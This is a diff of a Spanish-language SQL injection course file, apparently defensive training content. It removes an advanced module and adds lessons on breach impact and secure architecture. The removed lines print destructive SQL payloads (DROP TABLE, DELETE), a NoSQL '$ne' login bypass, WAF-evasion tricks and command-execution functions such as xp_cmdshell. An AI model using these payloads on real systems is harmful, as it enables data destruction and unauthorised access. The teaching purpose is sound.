-            <li><strong>Datos expuestos:</strong> ¿Se almacenan datos personales, financieros o confidenciales?</li>
-            <li><strong>Alcance del ataque:</strong> ¿Podría pivotear hacia otros sistemas?</li>
-            <li><strong>Controles existentes:</strong> ¿Hay un WAF, monitoreo activo o roles SQL restrictivos?</li>
-            <li><strong>Exposición:</strong> ¿Está en un servicio público o requiere autenticación interna?</li>
-          </ul>
-          <p>La conjunción de estos factores define la prioridad de corrección.</p>
+<h3>Modificación o destrucción de datos operativos</h3>
 
-          <h3>Priorización en la práctica</h3>
-          <p>
-            Las organizaciones suelen clasificar las vulnerabilidades como:
-            <strong>Críticas</strong>, <strong>Altas</strong>, <strong>Medias</strong>, <strong>Bajas</strong> o <strong>Informativas</strong>.
-          </p>
-          <p>
-            Una SQLi sin mitigaciones se considera <strong>Crítica</strong> y debe solucionarse de inmediato. Si no hay fix disponible, deben implementarse mitigaciones temporales como reglas específicas en el <strong>WAF</strong>, deshabilitar temporalmente la funcionalidad afectada o reforzar el monitoreo.
-          </p>
+<p>
+Cuando la cuenta utilizada por la aplicación tiene permisos para modificar o eliminar registros, el impacto puede convertirse en un daño operativo severo. La manipulación maliciosa puede alterar información crítica, afectar procesos internos o comprometer la integridad de reportes y sistemas asociados.
+</p>
 
-          <h3>Costo-beneficio</h3>
-          <p>
-            Generalmente, las SQLi son <strong>baratas de corregir</strong> y <strong>muy costosas de ignorar</strong>. El costo de implementar consultas parametrizadas o validaciones es bajo, mientras que el impacto de una brecha puede ser devastador. En la mayoría de los casos, no hay justificación válida para posponer la corrección.
-          </p>
+<p>
+Un atacante que logra una inyección SQL con permisos de escritura puede, por ejemplo, modificar estados de pedidos, alterar saldos en sistemas financieros o manipular niveles de inventario. En sistemas donde múltiples unidades dependen de datos sincronizados, una alteración masiva puede generar inconsistencias que requieran horas o días para corregirse.
+</p>
 
-          <h3>Aceptación de riesgo</h3>
-          <p>
-            En ocasiones puede ser necesario aceptar un riesgo residual, pero solo bajo condiciones muy controladas:
-            <ul>
-              <li>Existen mitigaciones efectivas (por ejemplo, la base no contiene datos sensibles y está aislada).</li>
-              <li>El costo de reparación es extremadamente alto comparado con el impacto.</li>
-              <li>El sistema afectado será reemplazado o retirado a corto plazo.</li>
-            </ul>
-            Toda aceptación debe documentarse formalmente, con responsables y plazos definidos.
-          </p>
+<p>
+Existen incidentes documentados donde atacantes lograron borrar tablas completas a través de consultas inyectadas. En uno de los casos más conocidos a nivel institucional, un sistema gubernamental de Utah sufrió una intrusión que permitió a los atacantes manipular y eliminar registros relacionados con la información electoral. Aunque existían copias de seguridad, el proceso de restauración tuvo consecuencias operativas que afectaron temporalmente la disponibilidad de servicios relacionados con el padrón electoral.
+</p>
 
-          <h3>Comunicación del riesgo</h3>
-          <p>
-            La comunicación efectiva a niveles no técnicos es esencial:
-            <blockquote>
-              “Existe una vulnerabilidad de inyección SQL que permite a un atacante obtener todos los datos de clientes sin autenticación. Esto equivale a un acceso directo como administrador a la base de datos. Tiene una severidad CVSS 9.1 (crítica) y debe corregirse en menos de una semana.”
-            </blockquote>
-          </p>
-          <p>Este lenguaje es comprensible para la gerencia y ayuda a justificar recursos y priorización. También es importante vincularlo a <strong>riesgos regulatorios</strong> (GDPR, PCI-DSS) y <strong>daño reputacional</strong>.</p>
+<h3>Interrupción de servicios y pérdida de disponibilidad</h3>
 
-          <h3>Priorización frente a otras iniciativas</h3>
-          <p>
-            Es común que surja el dilema entre “lanzar una nueva funcionalidad” o “parchar una vulnerabilidad crítica”. Las buenas prácticas indican que <strong>la seguridad prevalece</strong>: un incidente grave puede detener por completo el negocio, mientras que una feature puede esperar.
-          </p>
+<p>
+La explotación de una inyección SQL no solo afecta la integridad de los datos, sino también la disponibilidad. En muchos casos, los atacantes ejecutan consultas pesadas, inducen bloqueos en las tablas o fuerzan la caída del motor mediante errores intencionales. Cuando la aplicación depende de un sistema centralizado, incluso una interrupción breve puede generar un efecto en cadena.
+</p>
 
-          <h3>Seguimiento y registro</h3>
-          <p>
-            Toda vulnerabilidad debe ingresarse en un <strong>registro de riesgos</strong> (risk register o bug tracker), asignando severidad, responsable, fecha de corrección prevista y mitigaciones temporales. Esto evita que los hallazgos se pierdan o queden sin seguimiento.
-          </p>
+<p>
+Además, si el atacante logra eliminar registros o tablas completas, el sistema puede quedar inoperable hasta que se restauren datos desde respaldos. En escenarios donde las copias no están al día o la recuperación es compleja, esto se traduce en periodos prolongados de inactividad.
+</p>
 
-          <h2>Casos de Estudio</h2>
-          <h3>Caso 1 – SQLi en buscador público</h3>
-          <ul>
-            <li>Probabilidad: Alta (público y fácil de detectar).</li>
-            <li>Impacto: Alto (exposición de usuarios y contraseñas cifradas).</li>
-            <li>Mitigaciones: Ninguna.</li>
-            <li>CVSS estimado: 9.1 (Crítico).</li>
-            <li><strong>Prioridad:</strong> Crítica.</li>
-            <li><strong>Acciones:</strong> Corregir en menos de 48 horas; aplicar regla WAF temporal; notificar al área de seguridad.</li>
-          </ul>
+<p>
+Una caída de servicio de este tipo puede afectar negocios que operan con alta disponibilidad, como comercio electrónico, servicios financieros o sistemas médicos.
+</p>
 
-          <h3>Caso 2 – SQLi en módulo interno administrativo</h3>
-          <ul>
-            <li>Probabilidad: Baja (requiere autenticación y acceso interno).</li>
-            <li>Impacto: Alto (posible acceso extendido a datos).</li>
-            <li>CVSS: 6.5 (Media).</li>
-            <li><strong>Prioridad:</strong> Media.</li>
-            <li><strong>Acciones:</strong> Programar fix en el siguiente sprint; mitigar temporalmente; monitorear uso del módulo.</li>
-          </ul>
+<h3>Exfiltración seguida de movimiento lateral</h3>
 
-          <h3>Caso 3 – SQLi limitada por permisos</h3>
-          <ul>
-            <li>Probabilidad: Alta (detectable).</li>
-            <li>Impacto: Bajo (no accede a datos sensibles).</li>
-            <li><strong>Prioridad:</strong> Baja.</li>
-            <li><strong>Acciones:</strong> Corregir en ciclo regular; mantener permisos restringidos.</li>
-          </ul>
+<p>
+En ciertos casos, la inyección SQL es solo la primera etapa de un ataque más amplio. Algunos motores permiten funciones que interactúan con el sistema de archivos o con otros componentes del servidor. Si la vulnerabilidad se combina con permisos elevados o malas prácticas de configuración, el atacante puede subir archivos, ejecutar funciones externas o usar la base como punto de pivote para acceder a otros sistemas internos.
+</p>
 
-          <h3>Evaluación con OWASP Risk Rating</h3>
-          <p>
-            Este método combina factores cualitativos y cuantitativos:
-            <ul>
-              <li><strong>Amenaza:</strong> habilidad, motivos, oportunidades.</li>
-              <li><strong>Vulnerabilidad:</strong> facilidad de descubrimiento, explotación y detección.</li>
-              <li><strong>Impacto:</strong> financiero, reputacional, privacidad, cumplimiento.</li>
-            </ul>
-            Cada factor se puntúa del 0 al 9 y se obtiene un promedio que clasifica el riesgo en bajo, medio, alto o crítico.
-          </p>
+<p>
+En el ataque sufrido por Heartland Payment Systems, uno de los mayores procesadores de pago en Estados Unidos, la intrusión comenzó con una vulnerabilidad de inyección SQL en un sistema interno. Aunque la vulnerabilidad no exponía datos por sí sola, permitió la instalación de malware adicional. A partir de este punto, los atacantes interceptaron flujos de información sensible que pasaban por la red de procesamiento, comprometiendo decenas de millones de transacciones. El incidente derivó en costos financieros enormes, demandas colectivas y un daño reputacional de largo plazo.
+</p>
 
-          <h2>Errores comunes</h2>
-          <ul>
-            <li>Subestimar la vulnerabilidad porque “nunca pasó nada”.</li>
-            <li>Priorizar nuevas funciones sobre la seguridad.</li>
-            <li>No reevaluar riesgos tras cambios de contexto.</li>
-            <li>Confiar excesivamente en mitigaciones (como WAF o IDS).</li>
-            <li>No involucrar a la gerencia en la toma de decisiones.</li>
-          </ul>
+<p>
+Este tipo de evolución del ataque muestra que la inyección SQL puede servir como punto inicial para obtener control sistémico.
+</p>
 
-          <h2>Buenas prácticas</h2>
-          <ul>
-            <li>Mantener un <strong>cuadro de riesgos</strong> actualizado con severidad, impacto y planes de acción.</li>
-            <li>Establecer <strong>SLA de remediación</strong>: críticos ≤ 48h, altos ≤ 7 días, medios ≤ 30 días.</li>
-            <li>Realizar <strong>simulaciones de impacto</strong> para justificar recursos.</li>
-            <li>Implementar <strong>pentesting continuo</strong> o <strong>bug bounty</strong>.</li>
-            <li>Cumplir con <strong>estándares y normativas</strong> (ISO 27001, PCI-DSS).</li>
-            <li>Realizar <strong>lecciones aprendidas</strong> tras incidentes reales.</li>
-          </ul>
+<h3>Impacto reputacional y pérdida de confianza</h3>
 
-          <h2>Resumen</h2>
-          <p>
-            El análisis y la priorización del riesgo permiten enfocar los esfuerzos de seguridad donde más importan. La <strong>inyección SQL</strong> suele clasificarse como un riesgo <strong>crítico</strong> debido a su facilidad de explotación y alto potencial de daño.
-          </p>
-          <p>
-            El tratamiento debe basarse en criterios claros de <strong>probabilidad e impacto</strong>, apoyado en métricas estandarizadas (CVSS/OWASP). Además, debe comunicarse de manera efectiva a los responsables de negocio y gestionarse dentro de políticas formales de parches y seguimiento.
-          </p>
-          <p>
-            El objetivo no es solo corregir la vulnerabilidad, sino <strong>construir un proceso continuo</strong> de gestión de riesgos que prevenga su reaparición y mantenga la seguridad como prioridad estratégica.
-          </p>
+<p>
+Las brechas de seguridad derivadas de inyección SQL suelen percibirse como fallas básicas del desarrollo seguro. Debido a que esta vulnerabilidad es ampliamente conocida desde hace años, su explotación transmite la impresión de negligencia o deficiente gestión de riesgos, lo que agrava la percepción pública.
+</p>
+
+<p>
+Luego de los incidentes mencionados, empresas como TalkTalk y Heartland experimentaron efectos que perduraron más allá de la fase técnica del ataque. La pérdida de clientes, la caída en valor de mercado y la dificultad para recuperar confianza se convirtieron en consecuencias tan significativas como la brecha misma.
+</p>
+
+<p>
+En sectores donde la protección de datos es un componente esencial del servicio, como telecomunicaciones o transacciones financieras, la reputación afecta directamente la viabilidad comercial.
+</p>
+
+<h3>Repercusiones legales y regulatorias</h3>
+
+<p>
+Cuando la información expuesta incluye datos personales, las organizaciones pueden verse obligadas a notificar a los afectados, rendir informes a autoridades regulatorias y enfrentar sanciones. Legislaciones como el GDPR en Europa o la Ley Federal de Protección de Datos Personales en México estipulan multas severas para las organizaciones que no protegen adecuadamente la información bajo su custodia.
+</p>
+
+<p>
+En el caso de TalkTalk, la autoridad reguladora del Reino Unido concluyó que la vulnerabilidad explotada habría podido prevenirse fácilmente, lo que derivó en una multa significativa y obligaciones adicionales de cumplimiento. Este tipo de consecuencias afectan no solo las finanzas, sino también la estructura de gobernanza interna, obligando a rediseñar políticas y sistemas completos.
+</p>
+
+<h3>Bibliografía</h3>
+<ul>
+  <li>
+    OWASP Foundation, SQL Injection, [Online]. Available:
+    <a href="https://owasp.org/www-community/attacks/SQL_Injection" target="_blank">
+      https://owasp.org/www-community/attacks/SQL_Injection
+    </a>
+  </li>
+  <li>
+    Information Commissioner’s Office (Reino Unido), Documentos de investigación y sanciones.
+  </li>
+
+  <li>
+    D. Stuttard and M. Pinto, <i>The Web Application Hacker’s Handbook</i>, Wiley Publishing.
+  </li>
+
+  <li>
+    M. Howard and D. LeBlanc, <i>Writing Secure Code</i>, Microsoft Press.
+  </li>
+</ul>
         `
       },
-    'casos-avanzados-sqli': {
-      id: 'casos-avanzados-sqli',
-      title: 'Casos avanzados y consideraciones modernas',
-      description: 'Analiza escenarios complejos como SQL dinámico, procedimientos almacenados, limitaciones de ORMs y riesgos comparativos en bases NoSQL, con estrategias para mitigarlos.',
+    'diseño-seguro-sqli': {
+      id: 'diseño-seguro-sqli',
+      title: 'Arquitectura segura y buenas prácticas contra la inyección SQL',
+      description: 'Principios y recomendaciones para minimizar riesgos desde el diseño.',
       category: 'sqli',
       htmlContent: `
-          <h2>Introducción</h2>
           <p>
-            En este último módulo examinaremos <strong>casos avanzados de inyección SQL</strong>: escenarios menos comunes o más sofisticados que requieren un entendimiento profundo para ser prevenidos. Revisaremos conceptos como la <em>inyección de segundo orden</em>, variantes en entornos distintos a los típicos (por ejemplo, inyecciones en ORMs mal utilizados, inyecciones en bases de datos NoSQL, o inyecciones dentro de procedimientos almacenados dinámicos).
-          </p>
-          <p>
-            También exploraremos técnicas de evasión que atacantes avanzados emplean para sortear filtros o WAFs, como la ofuscación de payloads SQL, el uso de funciones alternativas o la fragmentación de consultas. Asimismo, tocaremos la posibilidad de <strong>inyecciones combinadas</strong> (ataques multivector) y cómo las SQLi pueden abrir la puerta a compromisos más amplios del sistema, por ejemplo, ejecutar comandos del sistema operativo desde la base de datos o exfiltrar datos mediante llamadas DNS.
-          </p>
-          <p>
-            El propósito es preparar al estudiante para reconocer y mitigar incluso las manifestaciones más complejas de esta amenaza, recordando que la mejor defensa sigue siendo aplicar los principios ya aprendidos —separación de código y datos, validación y parametrización— adaptados a cada contexto.
-          </p>
+Prevenir la inyección SQL no depende únicamente de validaciones o filtros aplicados en el código. Para minimizar el riesgo de manera efectiva, es necesario adoptar un enfoque arquitectónico que contemple múltiples capas de protección. La arquitectura segura considera cómo se gestionan las conexiones, cómo interactúan los servicios, cómo se encapsula el acceso a datos y qué controles complementarios se añaden para impedir que un atacante pueda manipular consultas. Esta lección se enfoca en patrones de diseño seguro y prácticas arquitectónicas que reducen, desde la raíz, la posibilidad de exposición a inyección SQL.
+</p>
 
-          <h2>Explicación</h2>
+<h3>Separación estricta entre lógica de negocio y acceso a datos</h3>
 
-          <h3>Inyección SQL de Segundo Orden</h3>
-          <p>
-            A diferencia de la SQLi "directa" (de primer orden), donde el atacante inyecta y obtiene resultados inmediatos, en la <strong>inyección de segundo orden</strong> el payload se almacena en la base de datos y se ejecuta posteriormente cuando otro proceso reutiliza ese dato en una nueva consulta.
-          </p>
-          <p>
-            <strong>Ejemplo típico:</strong> un atacante registra un usuario con el nombre <code>'; DROP TABLE usuarios;--</code>. Este valor se guarda tal cual en la base (aún sin efecto dañino). Más tarde, un script de administración construye dinámicamente una consulta usando los nombres de usuario:
-          </p>
-          <pre>SELECT * FROM usuarios WHERE nombre IN (<lista de nombres>);</pre>
-          <p>
-            Si concatena los valores sin parametrización, al llegar al nombre malicioso, se cerrará la consulta y ejecutará el <code>DROP TABLE</code>.  
-            También ocurre en foros o sistemas de búsqueda donde los datos almacenados se reutilizan en nuevas consultas SQL.
-          </p>
-          <p>
-            <strong>Defensa:</strong> parametrizar incluso esas consultas internas, validar y escapar los datos antes de reusarlos. En general, tratar todos los datos almacenados (aunque provengan de la base) como no confiables si van a formar parte de nuevas consultas.
-          </p>
+<p>
+Una característica clave de las arquitecturas seguras consiste en impedir que la lógica de negocio construya o manipule consultas SQL directamente. Para lograrlo, se emplean capas dedicadas de acceso a datos que encapsulan completamente la interacción con la base.
+</p>
 
-          <h3>Inyecciones en entornos ORM</h3>
-          <p>
-            Aunque los <strong>ORMs</strong> ofrecen una capa de abstracción que reduce el riesgo de SQLi, pueden ser vulnerables si se usan incorrectamente.
-          </p>
-          <ul>
-            <li>Ejemplo en Hibernate: <code>session.createQuery("FROM Producto WHERE categoria = '" + cat + "'")</code> es vulnerable.</li>
-            <li>En Django, el uso de <code>.extra()</code> o <code>raw()</code> puede permitir SQL crudo no parametrizado.</li>
-            <li>Pasar entrada del usuario a métodos como <code>order_by(raw(user_input))</code> reintroduce riesgo de inyección.</li>
-          </ul>
-          <p>
-            Incluso con ORMs, los desarrolladores pueden construir cadenas manualmente o abusar de funciones “raw”. Los atacantes también pueden explotar características internas para forzar consultas costosas (denegación de servicio mediante queries pesadas).
-          </p>
-          <p>
-            <strong>Defensa:</strong> usar los métodos del ORM que garantizan parametrización, evitar SQL crudo, y validar cualquier input usado para ordenar o filtrar dinámicamente.
-          </p>
+<p>Por ejemplo, en lugar de una construcción directa como:</p>
 
-          <h3>Inyecciones NoSQL</h3>
-          <p>
-            Las bases de datos NoSQL (como MongoDB, Cassandra o Redis) no usan SQL, pero también pueden sufrir inyecciones.
-          </p>
-          <p><strong>Ejemplo MongoDB:</strong></p>
-          <pre>db.users.find({ user: u, pass: p })</pre>
-          <p>
-            Si un atacante envía un objeto <code>{ "$ne": null }</code> como valor para <code>user</code> y <code>pass</code>, la consulta se convierte en:
-          </p>
-          <pre>{ user: { $ne: null }, pass: { $ne: null } }</pre>
-          <p>
-            Esto devuelve cualquier usuario, logrando un bypass de autenticación.
-          </p>
-          <p>
-            <strong>Prevención:</strong> validar tipos de entrada (asegurarse de que los campos sean cadenas y no objetos), usar validación de esquema (como Mongoose o Joi), y deshabilitar interpretaciones automáticas de operadores ($ne, $regex, etc.) en entradas del usuario.
-          </p>
+<pre><code class="language-html highlight-vulnerable">function obtenerUsuario(correo) {
+    return conexion.query("SELECT * FROM usuarios WHERE correo = '" + correo + "'");
+}
+</code></pre>
 
-          <h3>Inyecciones fuera de SQL convencional</h3>
-          <p>
-            El concepto de inyección se extiende más allá de SQL: LDAP, XPath, OGNL o incluso GraphQL pueden ser vulnerables si concatenan input en sus consultas.  
-            Por ejemplo, una <em>GraphQL Injection</em> ocurre si un desarrollador permite fragments arbitrarios sin validación.  
-            El patrón es universal: entrada del usuario + lenguaje interpretado + concatenación = riesgo.
-          </p>
+<p>la arquitectura introduce una capa donde las consultas están centralizadas y parametrizadas:</p>
 
-          <h3>Evasión de Filtros y WAFs</h3>
-          <p>
-            Los atacantes avanzados emplean diversas técnicas para evadir reglas básicas de detección:
-          </p>
-          <ul>
-            <li><strong>Codificación de caracteres:</strong> usar <code>%27</code> en lugar de <code>'</code> (URL encoding), o Unicode equivalente.</li>
-            <li><strong>Comentarios y espacios:</strong> insertar <code>/**/</code> para dividir palabras clave: <code>UNI/**/ON SEL/**/ECT</code>.</li>
-            <li><strong>Consultas sin comillas:</strong> usar comparaciones numéricas (<code>OR 1=1</code>) o representaciones hexadecimales (<code>UNHEX(HEX(...))</code>).</li>
-            <li><strong>Procedimientos peligrosos:</strong> ejecutar <code>xp_cmdshell</code> (MSSQL), <code>LOAD_FILE()</code> o <code>INTO OUTFILE</code> (MySQL).</li>
-            <li><strong>Exfiltración DNS (OOB):</strong> uso de funciones como <code>xp_dirtree</code> o <code>UTL_INADDR</code> para sacar datos vía DNS o SMB.</li>
-          </ul>
-          <p>
-            <strong>Defensa:</strong> no confiar en filtros por palabras clave, sino corregir la raíz del problema con consultas parametrizadas. Los WAF deben mantenerse actualizados y bien afinados, con revisiones frecuentes de sus firmas.
-          </p>
+<pre><code class="language-html highlight-secure">function obtenerUsuario(correo) {
+    const consulta = "SELECT * FROM usuarios WHERE correo = ?";
+    return conexion.query(consulta, [correo]);
+}
+</code></pre>
 
-          <h3>SQLi con Ejecución de Comandos del Sistema (RCE)</h3>
-          <p>
-            Algunas bases de datos permiten ejecutar comandos del sistema operativo, lo que convierte una SQLi en una <strong>ejecución remota de código</strong> (RCE).
-          </p>
-          <ul>
-            <li>En MSSQL: <code>xp_cmdshell</code>.</li>
-            <li>En PostgreSQL: <code>COPY TO PROGRAM</code>.</li>
-            <li>En MySQL: creación de funciones UDF o escritura en archivos con <code>SELECT INTO OUTFILE</code>.</li>
-          </ul>
-          <p>
-            Estas capacidades permiten a un atacante escalar de una inyección SQL a un control total del servidor.
-          </p>
+<p>
+Esta estructura impide que la lógica externa determine la forma de la consulta. Además, permite auditar y asegurar todas las operaciones SQL desde una ubicación única, facilitando la estandarización de prácticas seguras.
+</p>
 
-          <h3>Poliglotas y diferencias entre motores</h3>
-          <p>
-            Cada motor SQL tiene particularidades sintácticas:
-            <ul>
-              <li>Oracle requiere <code>FROM DUAL</code> para consultas sin tabla y maneja comentarios con <code>--</code> de manera diferente.</li>
-              <li>MySQL necesita un espacio tras <code>--</code>.</li>
-              <li>SQLite tiene limitaciones de multi-statement.</li>
-            </ul>
-            Los atacantes adaptan sus payloads según el motor. Por eso, las pruebas deben considerar la plataforma específica.
-          </p>
+<h3>Uso de servicios intermedios para aislamiento del motor de base de datos</h3>
 
-          <h3>Herramientas avanzadas</h3>
-          <p>
-            Herramientas como <strong>sqlmap</strong> ofrecen funciones especializadas:
-            <ul>
-              <li><code>--second-order</code>: detección de inyecciones de segundo orden.</li>
-              <li><strong>Tamper scripts</strong>: alteran payloads para evadir WAFs.</li>
-            </ul>
-            Es importante que los equipos defensivos conozcan estas opciones para evaluar su efectividad frente a ataques automatizados.
-          </p>
+<p>
+En arquitecturas modernas, la aplicación no interactúa directamente con el motor SQL, sino mediante un servicio intermedio, como una API dedicada o un microservicio de datos. El objetivo es aislar el motor y restringir la forma en que los datos llegan al backend.
+</p>
 
-          <h3>Mitigaciones modernas</h3>
-          <p>
-            Los frameworks y motores modernos integran medidas preventivas:
-            <ul>
-              <li>PostgreSQL: modo <code>sql_safe_updates</code> limita consultas destructivas sin <code>WHERE</code>.</li>
-              <li>Bibliotecas modernas de acceso a datos exigen consultas parametrizadas.</li>
-            </ul>
-            Aun así, ninguna herramienta sustituye la responsabilidad del desarrollador de validar y parametrizar correctamente.
-          </p>
+<p>
+Un ejemplo común consiste en exponer funciones específicas:
+</p>
 
-          <h3>Casos límite (Edge Cases)</h3>
-          <ul>
-            <li><strong>HTTP Parameter Pollution (HPP):</strong> enviar un parámetro duplicado puede generar concatenaciones inesperadas que introduzcan caracteres peligrosos.</li>
-            <li><strong>Problemas de codificación UTF-8:</strong> caracteres multibyte truncados pueden convertirse en comillas simples (<code>'</code>) y alterar la sintaxis.</li>
-            <li><strong>Inyecciones ciegas sin logs:</strong> uso de consultas basadas en tiempo (por ejemplo, <code>SLEEP()</code>) para evitar dejar rastros en registros.</li>
-          </ul>
+<p><code class="language-html highlight-secure">GET /api/usuarios/:id</code></p>
 
-          <h2>Ejemplos Avanzados</h2>
+<p>
+y permitir únicamente estas operaciones. En lugar de aceptar consultas flexibles o parámetros que alteren la lógica, el servicio implementa internamente consultas parametrizadas estrictas.
+</p>
 
-          <h3>Ejemplo 1: Inyección de segundo orden en aplicación real</h3>
-          <p>
-            Un sitio permite a los usuarios personalizar el título de su perfil. El título se muestra en una página donde un administrador puede filtrar usuarios por título.  
-            Internamente, la herramienta del administrador ejecuta:
-          </p>
-          <pre>WHERE titulo LIKE '%<palabra>%'</pre>
-          <p>
-            Un atacante establece como título: <code>%'; DELETE FROM usuarios WHERE 'a'='a</code>.  
-            Cuando el administrador busca “a”, la consulta se transforma en:
-          </p>
-          <pre>WHERE titulo LIKE '%'; DELETE FROM usuarios WHERE 'a'='a%'</pre>
-          <p>
-            Esto ejecuta el <code>DELETE</code> antes de producir un error de sintaxis. Resultado: todos los usuarios eliminados.
-          </p>
-          <p>
-            <strong>Solución:</strong> usar consultas parametrizadas, validar los caracteres permitidos en el título y escapar los comodines (% y ').
-          </p>
+<p>
+Este enfoque reduce la superficie de ataque porque el usuario nunca interactúa con consultas reales. La API controla completamente qué se ejecuta y cómo se ejecuta.
+</p>
 
-          <h3>Ejemplo 2: Bypass de filtrado básico</h3>
-          <p>
-            Si la aplicación bloquea la cadena “ or ”, un atacante puede usar:
-            <ul>
-              <li>“||” (en algunos motores actúa como OR o concatenación)</li>
-              <li>Distinto casing: “Or”, “oR”</li>
-              <li>Combinaciones: <code>' OR '1' like '1</code></li>
-            </ul>
-            <strong>Lección:</strong> los filtros de patrones son insuficientes; la única solución robusta es la parametrización.
-          </p>
+<h3>Implementación de almacenes de secretos y rotación de credenciales</h3>
 
-          <h3>Ejemplo 3: NoSQL Injection en login</h3>
-          <pre>db.users.findOne({ name: req.body.name, pass: req.body.pass })</pre>
-          <p>
-            Si el atacante envía <code>name[$ne]=dummy</code> y <code>password[$ne]=dummy</code>, algunos frameworks antiguos lo traducen a:
-          </p>
-          <pre>{ name: { $ne: "dummy" }, password: { $ne: "dummy" } }</pre>
-          <p>
-            Lo que devuelve cualquier registro, permitiendo autenticación sin credenciales válidas.
-          </p>
-          <p>
-            <strong>Prevención:</strong> validar que los campos sean strings, rechazar objetos, aplicar sanitización y usar validación de esquema.
-          </p>
+<p>
+Una arquitectura segura incluye un manejo centralizado de credenciales para evitar fugas de claves de base de datos. Los almacenes de secretos almacenan contraseñas, tokens y credenciales con cifrado fuerte, y permiten rotarlas periódicamente sin modificar el código.
+</p>
 
-          <h3>Ejemplo 4: Ataque combinado (Polyglot)</h3>
-          <p>
-            Una aplicación vulnerable tanto a XSS como a SQLi puede sufrir un ataque multivector.  
-            Por ejemplo, un atacante inyecta un script (XSS) que, al ser ejecutado por un administrador, realiza una petición AJAX maliciosa con payload SQLi a un endpoint interno.
-          </p>
-          <p>
-            <strong>Lección:</strong> las vulnerabilidades se potencian entre sí. Mitigar todas las capas es esencial para evitar compromisos encadenados.
-          </p>
+<pre><code class="language-html highlight-secure">DB_USER=app_user
+DB_PASS=clave_generada
+DB_HOST=10.0.0.5
+</code></pre>
 
-          <h2>Resumen</h2>
-          <p>
-            Los casos avanzados de inyección SQL demuestran que los atacantes adaptan sus técnicas a nuevos entornos y tecnologías. Desde inyecciones de segundo orden hasta bypass de WAFs, procedimientos almacenados inseguros o ataques en bases NoSQL, el principio es siempre el mismo: <strong>falta de separación entre código y datos</strong>.
-          </p>
-          <p>
-            La defensa efectiva sigue siendo aplicar de forma rigurosa la <strong>parametrización, validación y control de privilegios</strong>, complementadas con monitoreo, hardening y actualización continua. Entender estas variantes modernas permite anticiparse a vectores complejos y fortalecer la seguridad general de las aplicaciones.
-          </p>
+<p>
+El secreto nunca se incluye dentro del código fuente. Si un atacante obtuviera acceso parcial a la aplicación, la rotación frecuente impediría que un secreto comprometido siga siendo útil.
+</p>
+
+<p>
+Este principio mitiga el riesgo derivado de ataques donde el objetivo final es escalar privilegios sobre la base de datos.
+</p>
+
+<h3>Limitación de consultas dinámicas en toda la arquitectura</h3>
+
+<p>
+Una arquitectura robusta evita que existan puntos donde las consultas sean generadas dinámicamente en función de entradas no controladas. Cuando sea estrictamente necesario generar SQL dinámico, se deben aplicar listas blancas, separación de lógica y parámetros validados.
+</p>
+
+<p>Por ejemplo, si se permite ordenar resultados:</p>
+
+<pre><code class="language-html highlight-secure">const opcionesOrden = ["precio", "fecha", "nombre"];
+const ordenFinal = opcionesOrden.includes(req.query.orden) ? req.query.orden : "fecha";
+const consulta = "SELECT * FROM productos ORDER BY " + ordenFinal;
+</code></pre>
+
+<p>
+Aquí la arquitectura limita explícitamente qué valores se pueden usar como orden, evitando completamente que el usuario inserte texto arbitrario.
+</p>
+
+<h3>Uso de procedimientos almacenados seguros</h3>
+
+<p>
+Los procedimientos almacenados permiten encapsular consultas y lógica dentro de la base de datos. Si se diseñan correctamente, aceptan únicamente parámetros y no permiten construir consultas libres. Esta encapsulación evita que un atacante pueda reconstruir consultas completas.
+</p>
+
+<p>Ejemplo en MySQL:</p>
+
+<pre><code class="language-html highlight-secure">CREATE PROCEDURE obtenerProducto(IN p_id INT)
+BEGIN
+    SELECT nombre, precio FROM productos WHERE id = p_id;
+END;
+</code></pre>
+
+<p>En la aplicación:</p>
+
+<pre><code class="language-html highlight-secure">conexion.query("CALL obtenerProducto(?)", [req.query.id]);
+</code></pre>
+
+<p>
+El procedimiento no permite modificar la estructura de la consulta y reduce la probabilidad de manipulación. La arquitectura se vuelve más resistente porque la lógica reside en el motor y no en concatenaciones externas.
+</p>
+
+<h3>Monitoreo arquitectónico y análisis de comportamiento</h3>
+
+<p>
+La arquitectura moderna incluye herramientas que permiten monitorear continuamente patrones de consulta, detectar anomalías y bloquear comportamientos atípicos. Los motores SQL avanzados pueden registrar:
+</p>
+
+<ul>
+  <li>Consultas con errores recurrentes.</li>
+  <li>Consultas demasiado largas o con patrones inusuales.</li>
+  <li>Uso excesivo de operadores lógicos que no corresponden al flujo esperado.</li>
+</ul>
+
+<p>
+Además, soluciones complementarias como:
+</p>
+
+<ul>
+  <li>Sistemas de detección de intrusiones (IDS).</li>
+  <li>WAF especializados.</li>
+  <li>Logs centralizados con reglas de alerta.</li>
+</ul>
+
+<p>
+permiten detectar intentos de manipulación incluso si no llegan a ejecutarse.
+</p>
+
+<p>
+Este enfoque arquitectónico convierte la detección en un componente esencial del diseño, y no únicamente en una función reactiva.
+</p>
+
+<h3>Control de acceso basado en roles y segmentación de datos</h3>
+
+<p>
+Diseñar la arquitectura con privilegios granulares evita que una vulnerabilidad de SQL Injection tenga impacto total. La segmentación asegura que, incluso si un atacante obtiene acceso a una consulta, esta tenga alcance limitado.
+</p>
+
+<p>Ejemplo de permisos reducidos:</p>
+
+<pre><code class="language-html highlight-secure">GRANT SELECT ON inventario.* TO 'app_lectura'@'localhost';
+GRANT SELECT, INSERT, UPDATE ON ventas.* TO 'app_operaciones'@'localhost';
+</code></pre>
+
+<p>
+Cada módulo de la aplicación opera con un usuario distinto, limitando al mínimo las acciones permitidas. Esta separación evita que un ataque aislado comprometa toda la base de datos.
+</p>
+
+<h3>Desacoplamiento entre componentes para reducir la propagación del ataque</h3>
+
+<p>
+Cuando los diferentes subsistemas interactúan mediante canales controlados, se limita la propagación de un ataque. Por ejemplo:
+</p>
+
+<ul>
+  <li>Un módulo de reportes no debe tener acceso de escritura.</li>
+  <li>Un módulo de autenticación no debe poder consultar información sensible de otros módulos.</li>
+  <li>Los microservicios deben tener sus propias credenciales, aisladas del resto.</li>
+</ul>
+
+<p>
+Este desacoplamiento permite que la arquitectura atenúe automáticamente el daño potencial, ya que cada componente opera dentro de límites estrictos.
+</p>
+
+<h3>Bibliografía</h3>
+
+<ul>
+  <li>
+    OWASP Foundation, SQL Injection Prevention Cheat Sheet, [Online]. Available:
+    <a href="https://cheatsheetseries.owasp.org" target="_blank">
+      https://cheatsheetseries.owasp.org
+    </a>
+  </li>
+
+  <li>
+    OWASP Foundation, SQL Injection, [Online]. Available:
+    <a href="https://owasp.org/www-community/attacks/SQL_Injection" target="_blank">
+      https://owasp.org/www-community/attacks/SQL_Injection
+    </a>
+  </li>
+
+  <li>
+    PortSwigger, Web Security Academy, SQL Injection, [Online]. Available:
